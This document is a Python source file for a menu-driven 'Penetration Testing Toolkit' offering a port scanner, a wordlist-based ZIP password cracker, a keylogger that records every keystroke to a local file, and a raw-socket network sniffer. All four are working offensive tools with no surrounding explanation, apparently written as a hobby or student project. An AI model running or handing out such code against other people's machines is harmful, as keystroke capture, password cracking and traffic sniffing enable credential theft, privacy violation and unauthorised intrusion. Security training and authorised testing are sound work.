
import socket
import requests
import zipfile
from pynput import keyboard
from pynput.keyboard import Listener
import msvcrt
import threading
import os

def port_scanner():
    target = input("Enter target IP: ")
    ports = input("Enter comma-separated ports (e.g., 21,22,80): ")
    ports = [int(p.strip()) for p in ports.split(',')]

    print(f"\n[Scanning {target}...]\n")
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((target, port))
            print(f"[+] Port {port} is OPEN")
            s.close()
        except:
            print(f"[-] Port {port} is closed")

def zip_cracker():
    zip_file = input("Enter ZIP file path: ")
    wordlist = input("Enter password wordlist path: ")
    try:
        zf = zipfile.ZipFile(zip_file)
        with open(wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                try:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                    print(f"[+] Password found: {password}")
                    return
                except:
                    pass
        print("[-] Password not found.")
    except FileNotFoundError:
        print("[!] ZIP file or wordlist not found.")
    except zipfile.BadZipFile:
        print("[!] Invalid ZIP file.")

def flush_input_buffer():
    while msvcrt.kbhit():
        msvcrt.getch()

def start_keylogger():
    print("[*] Keylogger running. Press Ctrl+C to stop.\n[Output in keylog.txt]\n")

    def on_press(key):
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while listener.is_alive():
            listener.join(0.5)  # Allow KeyboardInterrupt to be caught
    except KeyboardInterrupt:
        listener.stop()
        flush_input_buffer()
        print("\n[+] Keylogger stopped. Returning to menu...")

def sniffer():
    host = input("Enter your local IP address (e.g., 192.168.1.2): ")

    try:
        sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sniffer.bind((host, 0))
        sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

        print("\n[Sniffing packets. Press Ctrl+C to stop]\n")
        while True:
            packet, addr = sniffer.recvfrom(65565)
            print(packet)
    except Exception as e:
        print(f"[!] Error: {e}\n(Note: You may need Admin/root privileges)")

# CLI menu
def main():
    while True:
        print("\n=== Penetration Testing Toolkit ===")
        print("1. Port Scanner")
        print("2. ZIP Password Cracker")
        print("3. Keylogger")
        print("4. Network Sniffer")
        print("5. Exit")
        choice = input("Enter your choice (1-5): ")

        if choice == '1':
            port_scanner()
        elif choice == '2':
            zip_cracker()
        elif choice == '3':
            try:
                start_keylogger()
            except KeyboardInterrupt:
                print("\n[Keylogger stopped]")
        elif choice == '4':
            sniffer()
        elif choice == '5':
            print("Exiting toolkit.")
            break
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print("\n[!]Program interrupted by user.Exiting...")